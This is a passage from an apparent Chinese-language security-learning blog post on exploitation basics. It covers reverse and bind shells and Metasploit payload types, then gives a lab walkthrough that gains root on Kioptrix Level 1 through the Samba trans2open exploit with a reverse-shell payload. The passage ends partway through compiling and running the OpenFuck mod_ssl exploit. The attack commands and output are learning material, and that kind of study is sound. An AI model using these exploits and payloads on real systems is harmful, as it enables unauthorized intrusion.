<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>HackThe4O4</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Documenting the journey of cyber security">
<meta property="og:type" content="website">
<meta property="og:title" content="HackThe4O4">
<meta property="og:url" content="https://no-flag.com/page/4/index.html">
<meta property="og:site_name" content="HackThe4O4">
<meta property="og:description" content="Documenting the journey of cyber security">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Noflag">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="HackThe4O4" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/cat.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  


<meta name="generator" content="Hexo 7.3.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="/img/mela.gif" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/"></a></h1>
		</hgroup>

		

		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/2024/12/21/hello-world/">About Me</a></li>
				        
							<li><a href="/archives">All articles</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="/img/mela.gif" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/2024/12/21/hello-world/">About Me</a></li>
		        
					<li><a href="/archives">All articles</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="exploit-Exploitation Basics" class="article article-type-exploit" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Exploitation%20Basics/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.082Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Exploitation%20Basics/">
        Exploitation Basics
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Exploitation-Basics"><a href="#Exploitation-Basics" class="headerlink" title="Exploitation Basics"></a>Exploitation Basics</h1><h3 id="Reverse-Shells-vs-Bind-Shells"><a href="#Reverse-Shells-vs-Bind-Shells" class="headerlink" title="Reverse Shells vs Bind Shells"></a>Reverse Shells vs Bind Shells</h3><p>參考文章:<a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10279849?sc=hot">https://ithelp.ithome.com.tw/articles/10279849?sc=hot</a></p>
<ul>
<li><p>所有的shell都是對機器的訪問</p>
</li>
<li><p>彈出shell -&gt; 可以訪問一台機器</p>
</li>
<li><p>reverse shell &gt; 受害者連接到攻擊機器</p>
<p>  <img src="/img/exploit_Untitled.png" alt="Untitled"></p>
<ul>
<li>nc &gt; 監聽一個端口<ul>
<li>lvp &gt; listening verbose part</li>
<li>電腦打開某端口</li>
</ul>
</li>
<li>在 &#x2F;bin&#x2F;sh 建立連線 &gt; 對象是 windows 是 cmd.exe</li>
<li>攻擊者(local)端監聽任何對4444 port的發起的連線</li>
<li>讓目標主機(受害者端)對攻擊者端的4444 port發起連線</li>
<li>雙方建立連線後</li>
</ul>
<p>  <img src="/img/exploit_Untitled_1.png" alt="Untitled">
  </p>
</li>
<li><p>bind shell &gt; 在機器上打開一個端口連接到目標</p>
<p>  <img src="/img/exploit_Untitled_2.png" alt="Untitled"></p>
<ul>
<li>當使用nc在特定端口上連接到特定目標機器時，對方會監聽攻擊機器的連接</li>
<li>綁定到目標(受害者)主機上的<strong>特定</strong>port來監聽傳入連接的shell，攻擊者會通過這port連到目標(受害)機器上</li>
<li>先使用nc 將 &#x2F;bin&#x2F;sh 綁定受害機器上的4444port</li>
<li>攻擊者在通過這個port連回受害機器</li>
</ul>
</li>
<li><p>Reverse shell是從受害<strong>主機對攻擊者主機</strong>發起連線 &gt; 受害者連接到攻擊機</p>
</li>
<li><p>Bind Shell是先在受害主機上綁定特定port，然後等來自<strong>攻擊者主機對受害主機</strong>發起連線，就像後門(backdoor)一樣 &gt; 攻擊者可以連接到受害者</p>
</li>
</ul>
<h3 id="Staged-vs-Non-Staged-Payloads"><a href="#Staged-vs-Non-Staged-Payloads" class="headerlink" title="Staged vs Non-Staged Payloads"></a><strong>Staged vs Non-Staged Payloads</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> 	        Staged vs Non-Staged Payloads</span><br><span class="line">                              |</span><br><span class="line">          -----------------------------------</span><br><span class="line">          |                                 |</span><br><span class="line">    Staged Payloads                    Non-Staged Payloads</span><br><span class="line">  |                   |            |                       |</span><br><span class="line">Meterpreter         Shell       Reverse TCP              Bind TCP</span><br><span class="line">  |                   |            |                       |</span><br><span class="line">Multiple Stages      Single     Two-Part Payload        Single-Part Payload</span><br><span class="line">  |                   |            |                       |</span><br><span class="line">Smaller Size     Easier to use    Versatile            Larger Size</span><br></pre></td></tr></table></figure>

<p>根據內容使用不同類型的payload</p>
<p>exploit是利用漏洞的程式碼，而payload可以造成損害</p>
<p>有些payload是我們用來發送給受害者並嘗試在機器上獲取shell的內容</p>
<ul>
<li><p>Non-staged</p>
<ul>
<li>Sends exploit shellcode all at once</li>
<li>Larger in size and won’t always work</li>
<li>Example: windows&#x2F;meterpreter_reverse_tcp</li>
<li>此Payload被完整地發送，包括漏洞利用</li>
<li>隨著利用的運行而整體全部發送出去</li>
<li>Payload包括了所選任務的利用和全部shell程式碼</li>
<li>一體化的負荷更加穩定</li>
<li>這些Payload比其它類型Payload更大</li>
</ul>
</li>
<li><p>Staged</p>
<ul>
<li>Sends payload in stages</li>
<li>Can be less stable</li>
<li>Example: windows&#x2F;meterpreter&#x2F;reverse_tcp</li>
<li>指令中meterpreter後面有一個「**&#x2F;<strong>」字符，象徵一個</strong>Staged** Payload</li>
<li>通常會被分成兩部分被發送</li>
<li>第一個部分包含一個小的Payload，用來使受害機器回連攻擊者</li>
<li>然後再傳輸第二個更大的Payload，這包含了剩餘的shellcode，然後整個Payload才能被執行</li>
<li>這類載Payload可用於有大小限制的環境或是規避檢測</li>
<li>透過網路載入這些元件會產生相當大的流量，並可能提醒防禦機制</li>
<li><code>可以幫助規避防毒軟體</code></li>
</ul>
</li>
<li><p>正<strong>斜線</strong>“ <strong>&#x2F;</strong> ”字元用於區分Non-staged Payload和Staged Payload。</p>
</li>
<li><p>Metasploit 框架將漏洞利用與成功利用後執行的內容（有效負載）分開</p>
</li>
<li><p>Metasploit框架中的有效負載也分為兩部分，stager和stage。</p>
<ul>
<li>stager 負責下載大的有效負載（階段），將其註入內存，並將執行傳遞給它</li>
</ul>
<p>  <img src="/img/exploit_Untitled_3.png" alt="Untitled">
  </p>
</li>
<li><p>許多可利用的情況限制了攻擊者可以在不改變的情況下將多少位元組載入到記憶體中的一個連續位置</p>
</li>
<li><p>這些情況下進行有趣的後期利用的一種方法是分階段交付Payload</p>
</li>
<li><p>Stagers 通常是用手工優化的彙編語言編寫的。攻擊者的目標是使 stager 盡可能小</p>
</li>
<li><p>小型 stager 使攻擊者可以自由地使用它進行更多攻擊</p>
</li>
</ul>
<h3 id="Gaining-Root-with-Metasploit"><a href="#Gaining-Root-with-Metasploit" class="headerlink" title="Gaining Root with Metasploit"></a><strong>Gaining Root with Metasploit</strong></h3><p>根據之前的掃描結果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] 192.168.19.140:139    -   Host could not be identified: Unix (**Samba 2.2.1a**)</span><br></pre></td></tr></table></figure>

<p>利用searchploit尋找發現的服務版本漏洞</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# searchsploit samba 2.2    </span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                               |  Path</span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Samba 2.0.x/2.2 - Arbitrary File Creation                                    | unix/remote/20968.txt</span><br><span class="line">Samba 2.2.0 &lt; 2.2.8 (OSX) - trans2open Overflow (Metasploit)                 | osx/remote/9924.rb</span><br><span class="line">Samba 2.2.2 &lt; 2.2.6 - <span class="string">&#x27;nttrans&#x27;</span> Remote Buffer Overflow (Metasploit) (1)      | linux/remote/16321.rb</span><br><span class="line">Samba 2.2.8 (BSD x86) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)            | bsd_x86/remote/16880.rb</span><br><span class="line">****Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalat | linux/local/23674.txt</span><br><span class="line">Samba 2.2.8 (Linux x86) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)          | linux_x86/remote/16861.rb</span><br><span class="line">Samba 2.2.8 (OSX/PPC) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)            | osx_ppc/remote/16876.rb</span><br><span class="line">Samba 2.2.8 (Solaris SPARC) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)      | solaris_sparc/remote/16330.rb</span><br><span class="line">Samba 2.2.8 - Brute Force Method Remote Command Execution                    | linux/remote/55.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (1)                   | unix/remote/22468.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (2)                   | unix/remote/22469.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (3)                   | unix/remote/22470.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (4)                   | unix/remote/22471.txt</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;nttrans&#x27;</span> Remote Overflow (Metasploit)                         | linux/remote/9936.rb</span><br><span class="line">Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow      | unix/remote/22356.c</span><br><span class="line">Samba 2.2.x - Remote Buffer Overflow                                         | linux/remote/7.pl</span><br><span class="line">Samba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution                            | multiple/remote/10.c</span><br><span class="line">Samba &lt; 3.0.20 - Remote Heap Overflow                                        | linux/remote/7701.txt</span><br><span class="line">Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                | linux_x86/dos/36741.py</span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>

<p>開啟msf利用該漏洞</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; search samba 2.2</span><br><span class="line">                                                                                                               </span><br><span class="line">Matching Modules                                                                                               </span><br><span class="line">================                                                                                               </span><br><span class="line">                                                                                                               </span><br><span class="line">   <span class="comment">#  Name                              Disclosure Date  Rank     Check  Description                           </span></span><br><span class="line">   -  ----                              ---------------  ----     -----  -----------                                          </span><br><span class="line">   0  exploit/multi/samba/nttrans       2003-04-07       average  No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow</span><br><span class="line">   1  exploit/freebsd/samba/trans2open  2003-04-07       great    No     Samba trans2open Overflow (*BSD x86)</span><br><span class="line">   **2  exploit/linux/samba/trans2open    2003-04-07       great    No     Samba trans2open Overflow (Linux x86)**</span><br><span class="line">   3  exploit/osx/samba/trans2open      2003-04-07       great    No     Samba trans2open Overflow (Mac OS X PPC)</span><br><span class="line">   4  exploit/solaris/samba/trans2open  2003-04-07       great    No     Samba trans2open Overflow (Solaris SPARC)</span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 4, use 4 or use exploit/solaris/samba/trans2open</span><br><span class="line"></span><br><span class="line">msf6 &gt; use exploit/linux/samba/trans2open</span><br><span class="line">[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/trans2open):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   **RHOSTS                   <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using**</span><br><span class="line">                                      -metasploit.html</span><br><span class="line">   RPORT   139              <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line"></span><br><span class="line">Payload options (linux/x86/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Samba 2.2.x - Bruteforce</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; <span class="built_in">set</span> RHOSTS 192.168.19.140</span><br><span class="line">RHOSTS =&gt; 192.168.19.140</span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.19.130:4444 </span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffdfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffcfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffbfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffafc...</span><br><span class="line">[*] Sending stage (1017704 bytes) to 192.168.19.140</span><br><span class="line">[*] 192.168.19.140 - Meterpreter session 5 closed.  Reason: Died</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff9fc...</span><br><span class="line">[*] Sending stage (1017704 bytes) to 192.168.19.140</span><br><span class="line">[*] 192.168.19.140 - Meterpreter session 6 closed.  Reason: Died</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff8fc...</span><br><span class="line">[*] Sending stage (1017704 bytes) to 192.168.19.140</span><br><span class="line">[*] 192.168.19.140 - Meterpreter session 7 closed.  Reason: Died</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff7fc...</span><br><span class="line">[*] Sending stage (1017704 bytes) to 192.168.19.140</span><br><span class="line">[*] 192.168.19.140 - Meterpreter session 8 closed.  Reason: Died</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff6fc...</span><br><span class="line"></span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<ul>
<li><p>解決run運行問題</p>
<p>  有時候kali在運行run後會出現</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[-] 192.168.19.140:139 - **Exploit failed: undefined method `each_module**<span class="string">&#x27; for [[&quot;x86/single_byte&quot;, Msf::Modules::Nop__X86__Single_byte::MetasploitModule], [&quot;x86/opty2&quot;, Msf::Modules::Nop__X86__Opty2::MetasploitModule]]:Array</span></span><br><span class="line"><span class="string">Did you mean?  each_slice</span></span><br><span class="line"><span class="string">[*] Exploit completed, but no session was created.</span></span><br></pre></td></tr></table></figure>
<p>  這樣的錯誤問題有可能是源碼中使用each_module，但我在查看該rb檔案後沒發現有這行</p>
<p>  <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/pull/18828/files">https://github.com/rapid7/metasploit-framework/pull/18828/files</a></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(X) nops.each_module &#123; |nopname, nopmod|</span><br><span class="line">(O) nops.each &#123; |nopname, nopmod|</span><br></pre></td></tr></table></figure>
<p>  後來決定更新看看msf</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **apt update; apt install metasploit-framework**</span><br></pre></td></tr></table></figure>
<p>  再次重開啟會看到msf沒報錯了</p>
</li>
</ul>
<p>但從運行結果看到 <code>Meterpreter session X closed.  Reason: Died</code> </p>
<p>這有可能是Payload的問題，可以換一個試試</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(linux/samba/trans2open) &gt; **options** </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/trans2open):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS  192.168.19.140   <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using</span><br><span class="line">                                      -metasploit.html</span><br><span class="line">   RPORT   139              <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line"></span><br><span class="line">Payload options (linux/x86/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Samba 2.2.x - Bruteforce</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; **<span class="built_in">set</span> payload** </span><br><span class="line"><span class="built_in">set</span> payload generic/custom                            <span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload generic/debug_trap                        <span class="built_in">set</span> payload linux/x86/metsvc_bind_tcp</span><br><span class="line"><span class="built_in">set</span> payload generic/shell_bind_aws_ssm                <span class="built_in">set</span> payload linux/x86/metsvc_reverse_tcp</span><br><span class="line"><span class="built_in">set</span> payload generic/shell_bind_tcp                    <span class="built_in">set</span> payload linux/x86/read_file</span><br><span class="line"><span class="built_in">set</span> payload generic/shell_reverse_tcp                 <span class="built_in">set</span> payload linux/x86/shell/bind_ipv6_tcp</span><br><span class="line"><span class="built_in">set</span> payload generic/ssh/interact                      <span class="built_in">set</span> payload linux/x86/shell/bind_ipv6_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload generic/tight_loop                        <span class="built_in">set</span> payload linux/x86/shell/bind_nonx_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/adduser                         <span class="built_in">set</span> payload linux/x86/shell/bind_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/chmod                           <span class="built_in">set</span> payload linux/x86/shell/bind_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/exec                            <span class="built_in">set</span> payload linux/x86/shell/reverse_ipv6_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_ipv6_tcp       <span class="built_in">set</span> payload linux/x86/shell/reverse_nonx_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_ipv6_tcp_uuid  <span class="built_in">set</span> payload linux/x86/shell/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_nonx_tcp       <span class="built_in">set</span> payload linux/x86/shell/reverse_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_tcp            <span class="built_in">set</span> payload linux/x86/shell_bind_ipv6_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_tcp_uuid       <span class="built_in">set</span> payload linux/x86/shell_bind_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_ipv6_tcp    <span class="built_in">set</span> payload linux/x86/shell_bind_tcp_random_port</span><br><span class="line">**<span class="built_in">set</span> payload linux/x86/meterpreter/reverse_nonx_tcp    <span class="built_in">set</span> payload linux/x86/shell_reverse_tcp**</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp         <span class="built_in">set</span> payload linux/x86/shell_reverse_tcp_ipv6</span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; **<span class="built_in">set</span> payload linux/x86/shell_reverse_tcp**</span><br><span class="line">payload =&gt; linux/x86/shell_reverse_tcp</span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; **options**</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/trans2open):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS  192.168.19.140   <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using</span><br><span class="line">                                      -metasploit.html</span><br><span class="line">   RPORT   139              <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line"></span><br><span class="line">**Payload options (linux/x86/shell_reverse_tcp):**</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   CMD    /bin/sh          <span class="built_in">yes</span>       The <span class="built_in">command</span> string to execute</span><br><span class="line">   LHOST  192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Samba 2.2.x - Bruteforce</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br></pre></td></tr></table></figure>

<p>確認更換好payload後執行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(linux/samba/trans2open) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.19.130:4444 </span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffdfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffcfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffbfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffafc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff9fc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff8fc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff7fc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff6fc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff5fc...</span><br><span class="line">[*] Command shell session 9 opened (192.168.19.130:4444 -&gt; 192.168.19.140:32777) at 2024-02-14 14:59:48 -0500</span><br><span class="line"></span><br><span class="line">[*] Command shell session 10 opened (192.168.19.130:4444 -&gt; 192.168.19.140:32778) at 2024-02-14 14:59:49 -0500</span><br><span class="line">[*] Command shell session 11 opened (192.168.19.130:4444 -&gt; 192.168.19.140:32779) at 2024-02-14 14:59:50 -0500</span><br><span class="line">[*] Command shell session 12 opened (192.168.19.130:4444 -&gt; 192.168.19.140:32780) at 2024-02-14 14:59:51 -0500</span><br><span class="line"></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">hostname</span><br><span class="line">kioptrix.level1</span><br><span class="line"><span class="built_in">cat</span> /proc/version</span><br><span class="line">**Linux version 2.4.7-10** (bhcompile@stripples.devel.redhat.com) (gcc version 2.96 20000731 (Red Hat Linux 7.1 2.96-98)) <span class="comment">#1 Thu Sep 6 16:46:36 EDT 2001</span></span><br></pre></td></tr></table></figure>

<p>成功利用版本漏洞進行RCE，同時知道了目標系統是Red Hat Linux 7.1 2.96-98</p>
<p>查看linux版本方法</p>
<ul>
<li>lsb_release -a</li>
<li>cat &#x2F;etc&#x2F;issue</li>
<li>cat &#x2F;proc&#x2F;version</li>
</ul>
<h3 id="Manual-Exploitation"><a href="#Manual-Exploitation" class="headerlink" title="Manual Exploitation"></a><strong>Manual Exploitation</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">+** Red Hat Linux 7.1 2.96-98</span><br></pre></td></tr></table></figure>

<p>根據前面找到的資訊進一步利用</p>
<p>apache mod_ssl 該版本有可利用的漏洞，下載OpenFuck進行利用，根據版本選擇OffSet</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt]</span><br><span class="line">└─# git <span class="built_in">clone</span> https://github.com/heltonWernik/OpenFuck.git</span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/opt]</span><br><span class="line">└─# <span class="built_in">cd</span> OpenFuck </span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# <span class="built_in">ls</span></span><br><span class="line">OpenFuck.c  README.md</span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# apt-get install libssl-dev</span><br><span class="line"></span><br><span class="line">                                                                                                                      </span><br><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# gcc -o OpenFuck OpenFuck.c -lcrypto</span><br><span class="line"></span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# <span class="built_in">ls</span></span><br><span class="line">OpenFuck  OpenFuck.c  README.md</span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# ./OpenFuck</span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line">* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *</span><br><span class="line">*******************************************************************</span><br><span class="line">* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</span><br><span class="line">* <span class="comment">#hackarena  irc.brasnet.org                                     *</span></span><br><span class="line">* TNX Xanthic USG <span class="comment">#SilverLords #BloodBR #isotk #highsecure #uname *</span></span><br><span class="line">* <span class="comment">#ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span></span><br><span class="line">* <span class="comment">#pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span></span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line">: Usage: ./OpenFuck target box [port] [-c N]</span><br><span class="line"></span><br><span class="line">  target - supported box eg: 0x00</span><br><span class="line">  box - hostname or IP address</span><br><span class="line">  port - port <span class="keyword">for</span> ssl connection</span><br><span class="line">  -c open N connections. (use range 40-50 <span class="keyword">if</span> u dont know)</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  Supported OffSet:</span><br><span class="line">        0x00 - Caldera OpenLinux (apache-1.3.26)</span><br><span class="line">        0x01 - Cobalt Sun 6.0 (apache-1.3.12)</span><br><span class="line">        0x02 - Cobalt Sun 6.0 (apache-1.3.20)</span><br><span class="line">        0x03 - Cobalt Sun x (apache-1.3.26)</span><br><span class="line">        0x04 - Cobalt Sun x Fixed2 (apache-1.3.26)</span><br><span class="line">        0x05 - Conectiva 4 (apache-1.3.6)</span><br><span class="line">        0x06 - Conectiva 4.1 (apache-1.3.9)</span><br><span class="line">        0x07 - Conectiva 6 (apache-1.3.14)</span><br><span class="line">        0x08 - Conectiva 7 (apache-1.3.12)</span><br><span class="line">        0x09 - Conectiva 7 (apache-1.3.19)</span><br><span class="line">        0x0a - Conectiva 7/8 (apache-1.3.26)</span><br><span class="line">        0x0b - Conectiva 8 (apache-1.3.22)</span><br><span class="line">        0x0c - Debian GNU Linux 2.2 Potato (apache_1.3.9-14.1)</span><br><span class="line">        0x0d - Debian GNU Linux (apache_1.3.19-1)</span><br><span class="line">        0x0e - Debian GNU Linux (apache_1.3.22-2)</span><br><span class="line">        0x0f - Debian GNU Linux (apache-1.3.22-2.1)</span><br><span class="line">        0x10 - Debian GNU Linux (apache-1.3.22-5)</span><br><span class="line">        0x11 - Debian GNU Linux (apache_1.3.23-1)</span><br><span class="line">        0x12 - Debian GNU Linux (apache_1.3.24-2.1)</span><br><span class="line">        0x13 - 